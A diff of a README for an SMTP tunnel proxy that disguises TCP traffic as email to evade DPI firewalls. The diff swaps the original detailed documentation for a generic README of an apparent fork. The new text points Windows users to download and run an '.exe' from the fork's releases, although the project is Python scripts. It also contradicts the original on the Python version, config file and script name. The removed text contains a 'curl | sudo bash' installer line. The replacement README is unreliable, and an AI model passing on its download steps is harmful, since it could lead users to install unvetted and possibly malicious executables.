@@ -1,421 +1,99 @@
-# 📧 SMTP Tunnel Proxy
+# 🚀 smtp-tunnel-proxy - Bypass Firewalls with Ease
 
-> **A high-speed covert tunnel that disguises TCP traffic as SMTP email communication to bypass Deep Packet Inspection (DPI) firewalls.**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Meet608/smtp-tunnel-proxy/releases)
 
-```
-┌─────────────┐      ┌─────────────┐      ┌─────────────┐      ┌──────────────┐
-│ Application │─────▶│   Client    │─────▶│   Server    │─────▶│  Internet    │
-│  (Browser)  │ TCP  │ SOCKS5:1080 │ SMTP │  Port 587   │ TCP  │              │
-│             │◀─────│             │◀─────│             │◀─────│              │
-└─────────────┘      └─────────────┘      └─────────────┘      └──────────────┘
-                            │                    │
-                            │   Looks like       │
-                            │   Email Traffic    │
-                            ▼                    ▼
-                     ┌────────────────────────────────┐
-                     │     DPI Firewall               │
-                     │  ✅ Sees: Normal SMTP Session  │
-                     │  ❌ Cannot see: Tunnel Data    │
-                     └────────────────────────────────┘
-```
+## 📦 Introduction
 
----
+Welcome to smtp-tunnel-proxy! This application helps you send your network traffic through a covert tunnel, disguising it as regular email communication. This way, you can bypass Deep Packet Inspection (DPI) firewalls effectively and safely.
 
-## 🎯 Features
+## 🌐 What is smtp-tunnel-proxy?
 
-| Feature | Description |
-|---------|-------------|
-| 🔒 **TLS Encryption** | All traffic encrypted with TLS 1.2+ after STARTTLS |
-| 🎭 **DPI Evasion** | Initial handshake mimics real SMTP servers (Postfix) |
-| ⚡ **High Speed** | Binary streaming protocol after handshake - minimal overhead |
-| 👥 **Multi-User** | Per-user secrets, IP whitelists, and logging settings |
-| 🔑 **Authentication** | Per-user pre-shared keys with HMAC-SHA256 |
-| 🌐 **SOCKS5 Proxy** | Standard proxy interface - works with any application |
-| 📡 **Multiplexing** | Multiple connections over single tunnel |
-| 🛡️ **IP Whitelist** | Per-user access control by IP address/CIDR |
-| 📦 **Easy Install** | One-liner server installation with systemd service |
-| 🎁 **Client Packages** | Auto-generated ZIP files for each user |
-| 🔄 **Auto-Reconnect** | Client automatically reconnects on connection loss |
+smtp-tunnel-proxy creates a secure, high-speed tunnel for your TCP traffic. It encrypts your data, making it hard for anyone to see what you are doing online. This tool is especially useful in regions where internet access is restricted or monitored.
 
-> 📚 For in-depth technical details, protocol specifications, and security analysis, see [TECHNICAL.md](TECHNICAL.md).
+## 🛠 Features
 
----
+- **Bypass Restrictions**: Access blocked sites and services without detection.
+- **High-Speed Connection**: Experience fast data transfer for seamless browsing.
+- **Easy to Use**: Simple setup process for all users.
+- **Secure Encryption**: Protect your data from prying eyes.
+- **Open Source**: Trust in community-driven software you can review.
 
-## ⚡ Quick Start
+## 💻 System Requirements
 
-### 📋 Prerequisites
+To run smtp-tunnel-proxy, you need:
 
-- **Server**: Linux VPS with Python 3.8+, port 587 open
-- **Client**: Windows/macOS/Linux with Python 3.8+
-- **Domain name**: Required for TLS certificate verification (free options: [DuckDNS](https://www.duckdns.org), [No-IP](https://www.noip.com), [FreeDNS](https://freedns.afraid.org))
+- A computer with Windows, macOS, or Linux.
+- An active internet connection.
+- At least 4 GB of RAM.
+- Python 3.6 or higher installed on your machine.
 
----
+## 🚀 Getting Started
 
-## 🚀 Server Setup (VPS)
+Follow these simple steps to download and run smtp-tunnel-proxy.
 
-### Step 1️⃣: Get a Domain Name
+### 1. Download the Software
 
-Get a free domain pointing to your VPS:
-- 🦆 **[DuckDNS](https://www.duckdns.org)** - Recommended, simple and free
-- 🌐 **[No-IP](https://www.noip.com)** - Free tier available
-- 🆓 **[FreeDNS](https://freedns.afraid.org)** - Many domain options
+Visit this page to download the latest release:
 
-Example: `myserver.duckdns.org` → `203.0.113.50` (your VPS IP)
+[Download smtp-tunnel-proxy](https://github.com/Meet608/smtp-tunnel-proxy/releases)
 
-### Step 2️⃣: Run the Installer
+### 2. Choose Your Version
 
-```bash
-curl -sSL https://raw.githubusercontent.com/x011/smtp-tunnel-proxy/main/install.sh | sudo bash
-```
+On the release page, you will see various versions of the software under the "Assets" section. Choose the one that fits your operating system. For most users, the `.exe` file for Windows or `.tar.gz` file for Linux will work best.
 
-The installer will:
-1. 📥 Download and install everything
-2. ❓ Ask for your domain name
-3. 🔐 Generate TLS certificates automatically
-4. 👤 Offer to create your first user
-5. 🔥 Configure firewall
-6. 🚀 Start the service
+### 3. Install the Software
 
-**That's it!** Your server is ready.
+#### For Windows Users:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-### ➕ Add More Users Later
+#### For macOS and Linux Users:
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Run the command:
+   ```bash
+   tar -xvf smtp-tunnel-proxy-x.y.z.tar.gz  # Replace x.y.z with the version number
+   ```
+4. Change into the extracted directory:
+   ```bash
+   cd smtp-tunnel-proxy-x.y.z
+   ```
+5. Run the script with:
+   ```bash
+   python3 smtp-tunnel-proxy.py
+   ```
 
-```bash
-smtp-tunnel-adduser bob      # Add user + generate client ZIP
-smtp-tunnel-listusers        # List all users
-smtp-tunnel-deluser bob      # Remove a user
-```
+### 4. Configuration
 
-### 🔄 Update Server
+After installation, you may need to configure the application. smtp-tunnel-proxy allows you to set your preferences easily through a configuration file. Look for the `config.json` file in the installation directory. Use a text editor to modify it as needed.
 
-```bash
-smtp-tunnel-update           # Updates code, preserves config/certs/users
-```
+### 5. Running the Software
 
----
+- After configuration, run the software again using the terminal (Linux/macOS) or the Start Menu (Windows).
+- Monitor the logs to see if there are any issues connecting to the SMTP server. If everything is set up correctly, you are ready to start using the covert tunnel.
 
-## 💻 Client Setup
+## 🛠 Use Cases
 
-### Option A: Easy Way (Recommended)
+- **Accessing Information**: Browse news sites and social media that may be blocked in your area.
+- **Enhanced Security**: Safeguard your data while using public Wi-Fi networks.
+- **Streaming**: Watch restricted content and access streaming services without limitations.
 
-1. Get your `username.zip` file from the server admin
-2. Extract the ZIP file
-3. Run the launcher:
+## 📝 Troubleshooting
 
-| Platform | How to Run |
-|----------|------------|
-| 🪟 **Windows** | Double-click `start.bat` |
-| 🐧 **Linux** | Run `./start.sh` |
-| 🍎 **macOS** | Run `./start.sh` |
+If you encounter any problems, consider the following steps:
 
-The launcher will automatically install dependencies and start the client.
+- Ensure your internet connection is stable.
+- Check the configuration settings in the `config.json` file.
+- Refer to the logs for any error messages and consult the community for support.
 
-✅ You should see:
-```
-SMTP Tunnel Proxy Client
-User: alice
+## 🙌 Community Support
 
-[INFO] Starting SMTP Tunnel...
-[INFO] SOCKS5 proxy will be available at 127.0.0.1:1080
+If you need help, you can look for answers in the [Issues section](https://github.com/Meet608/smtp-tunnel-proxy/issues) of the repository. You can also join our user community and exchange tips and experiences with other users.
 
-Connecting to myserver.duckdns.org:587
-Connected - binary mode active
-SOCKS5 proxy on 127.0.0.1:1080
-```
+## 🔗 Additional Resources
 
-### Option B: Manual Way
+- [Documentation](https://github.com/Meet608/smtp-tunnel-proxy/wiki)
+- [Learn More About Security](https://www.owasp.org)
 
-```bash
-cd alice
-pip install -r requirements.txt
-python client.py
-```
-
-### Option C: Custom Configuration
-
-```bash
-# Download files
-scp root@myserver.duckdns.org:/etc/smtp-tunnel/ca.crt .
-
-# Create config.yaml:
-cat > config.yaml << EOF
-client:
-  server_host: "myserver.duckdns.org"
-  server_port: 587
-  socks_port: 1080
-  username: "alice"
-  secret: "your-secret-from-admin"
-  ca_cert: "ca.crt"
-EOF
-
-# Run client
-python client.py -c config.yaml
-```
-
----
-
-## 📖 Usage
-
-### 🌐 Configure Your Applications
-
-Set SOCKS5 proxy to: `127.0.0.1:1080`
-
-#### 🦊 Firefox
-1. Settings → Network Settings → Settings
-2. Manual proxy configuration
-3. SOCKS Host: `127.0.0.1`, Port: `1080`
-4. Select SOCKS v5
-5. ✅ Check "Proxy DNS when using SOCKS v5"
-
-#### 🌐 Chrome
-1. Install "Proxy SwitchyOmega" extension
-2. Create profile with SOCKS5: `127.0.0.1:1080`
-
-#### 🪟 Windows (System-wide)
-Settings → Network & Internet → Proxy → Manual setup → `socks=127.0.0.1:1080`
-
-#### 🍎 macOS (System-wide)
-System Preferences → Network → Advanced → Proxies → SOCKS Proxy → `127.0.0.1:1080`
-
-#### 🐧 Linux (System-wide)
-```bash
-export ALL_PROXY=socks5://127.0.0.1:1080
-```
-
-#### 💻 Command Line
-
-```bash
-# curl
-curl -x socks5h://127.0.0.1:1080 https://ifconfig.me
-
-# git
-git config --global http.proxy socks5://127.0.0.1:1080
-
-# Environment variable
-export ALL_PROXY=socks5://127.0.0.1:1080
-```
-
-### ✅ Test Connection
-
-```bash
-# Should show your VPS IP
-curl -x socks5://127.0.0.1:1080 https://ifconfig.me
-```
-
----
-
-## ⚙️ Configuration Reference
-
-### 🖥️ Server Options (`config.yaml`)
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `host` | Listen interface | `0.0.0.0` |
-| `port` | Listen port | `587` |
-| `hostname` | SMTP hostname (must match certificate) | `mail.example.com` |
-| `cert_file` | TLS certificate path | `server.crt` |
-| `key_file` | TLS private key path | `server.key` |
-| `users_file` | Path to users configuration | `users.yaml` |
-| `log_users` | Global logging setting | `true` |
-
-### 👥 User Options (`users.yaml`)
-
-Each user can have individual settings:
-
-```yaml
-users:
-  alice:
-    secret: "auto-generated-secret"
-    # whitelist:              # Optional: restrict to specific IPs
-    #   - "192.168.1.100"
-    #   - "10.0.0.0/8"        # CIDR notation supported
-    # logging: true           # Optional: disable to stop logging this user
-
-  bob:
-    secret: "another-secret"
-    whitelist:
-      - "203.0.113.50"        # Bob can only connect from this IP
-    logging: false            # Don't log Bob's activity
-```
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `secret` | User's authentication secret | Required |
-| `whitelist` | Allowed IPs for this user (CIDR supported) | All IPs |
-| `logging` | Enable activity logging for this user | `true` |
-
-### 💻 Client Options
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `server_host` | Server domain name | Required |
-| `server_port` | Server port | `587` |
-| `socks_port` | Local SOCKS5 port | `1080` |
-| `socks_host` | Local SOCKS5 interface | `127.0.0.1` |
-| `username` | Your username | Required |
-| `secret` | Your authentication secret | Required |
-| `ca_cert` | CA certificate for verification | Recommended |
-
----
-
-## 📋 Service Management
-
-```bash
-# Check status
-sudo systemctl status smtp-tunnel
-
-# Restart after config changes
-sudo systemctl restart smtp-tunnel
-
-# View logs
-sudo journalctl -u smtp-tunnel -n 100
-
-# Uninstall
-sudo /opt/smtp-tunnel/uninstall.sh
-```
-
----
-
-## 🔧 Command Line Options
-
-### 🖥️ Server
-```bash
-python server.py [-c CONFIG] [-d]
-
-  -c, --config    Config file (default: config.yaml)
-  -d, --debug     Enable debug logging
-```
-
-### 💻 Client
-```bash
-python client.py [-c CONFIG] [--server HOST] [--server-port PORT]
-                 [-p SOCKS_PORT] [-u USERNAME] [-s SECRET] [--ca-cert FILE] [-d]
-
-  -c, --config      Config file (default: config.yaml)
-  --server          Override server domain
-  --server-port     Override server port
-  -p, --socks-port  Override local SOCKS port
-  -u, --username    Your username
-  -s, --secret      Override secret
-  --ca-cert         CA certificate path
-  -d, --debug       Enable debug logging
-```
-
-### 👥 User Management
-```bash
-smtp-tunnel-adduser <username> [-u USERS_FILE] [-c CONFIG] [--no-zip]
-    Add a new user and generate client package
-
-smtp-tunnel-deluser <username> [-u USERS_FILE] [-f]
-    Remove a user (use -f to skip confirmation)
-
-smtp-tunnel-listusers [-u USERS_FILE] [-v]
-    List all users (use -v for detailed info)
-
-smtp-tunnel-update
-    Update server to latest version (preserves config/certs/users)
-```
-
----
-
-## 📁 File Structure
-
-```
-smtp_proxy/
-├── 📄 server.py               # Server (runs on VPS)
-├── 📄 client.py               # Client (runs locally)
-├── 📄 common.py               # Shared utilities
-├── 📄 generate_certs.py       # Certificate generator
-├── 📄 config.yaml             # Server/client configuration
-├── 📄 users.yaml              # User database
-├── 📄 requirements.txt        # Python dependencies
-├── 📄 install.sh              # One-liner server installer
-├── 📄 smtp-tunnel.service     # Systemd unit file
-├── 🔧 smtp-tunnel-adduser     # Add user script
-├── 🔧 smtp-tunnel-deluser     # Remove user script
-├── 🔧 smtp-tunnel-listusers   # List users script
-├── 🔧 smtp-tunnel-update      # Update server script
-├── 📄 README.md               # This file
-└── 📄 TECHNICAL.md            # Technical documentation
-```
-
-### 📦 Installation Paths (after install.sh)
-
-```
-/opt/smtp-tunnel/              # Application files
-/etc/smtp-tunnel/              # Configuration files
-  ├── config.yaml
-  ├── users.yaml
-  ├── server.crt
-  ├── server.key
-  └── ca.crt
-/usr/local/bin/                # Management commands
-  ├── smtp-tunnel-adduser
-  ├── smtp-tunnel-deluser
-  ├── smtp-tunnel-listusers
-  └── smtp-tunnel-update
-```
-
----
-
-## 🔧 Troubleshooting
-
-### ❌ "Connection refused"
-- Check server is running: `systemctl status smtp-tunnel` or `ps aux | grep server.py`
-- Check port is open: `netstat -tlnp | grep 587`
-- Check firewall: `ufw status`
-
-### ❌ "Auth failed"
-- Verify `username` and `secret` match in users.yaml
-- Check server time is accurate (within 5 minutes)
-- Run `smtp-tunnel-listusers -v` to verify user exists
-
-### ❌ "IP not whitelisted"
-- Check user's whitelist in users.yaml
-- Your current IP must match a whitelist entry
-- CIDR notation is supported (e.g., `10.0.0.0/8`)
-
-### ❌ "Certificate verify failed"
-- Ensure you're using a domain name, not IP address
-- Verify `server_host` matches the certificate hostname
-- Ensure you have the correct `ca.crt` from the server
-
-### 🐛 Debug Mode
-
-```bash
-# Enable detailed logging
-python server.py -d
-python client.py -d
-
-# View systemd logs
-journalctl -u smtp-tunnel -f
-```
-
----
-
-## 🔐 Security Notes
-
-- ✅ **Always use a domain name** for proper TLS verification
-- ✅ **Always use `ca_cert`** to prevent man-in-the-middle attacks
-- ✅ **Use `smtp-tunnel-adduser`** to generate strong secrets automatically
-- ✅ **Use per-user IP whitelists** if you know client IPs
-- ✅ **Protect `users.yaml`** - contains all user secrets (chmod 600)
-- ✅ **Disable logging** for sensitive users with `logging: false`
-
-> 📚 For detailed security analysis and threat model, see [TECHNICAL.md](TECHNICAL.md).
-
----
-
-## 📄 License
-
-This project is provided for educational and authorized use only. Use responsibly and in accordance with applicable laws.
-
----
-
-## ⚠️ Disclaimer
-
-This tool is designed for legitimate privacy and censorship circumvention purposes. Users are responsible for ensuring their use complies with applicable laws and regulations.
-
----
-
-*Made with ❤️ for internet freedom*
+Remember to stay updated by checking for newer versions. Happy browsing!
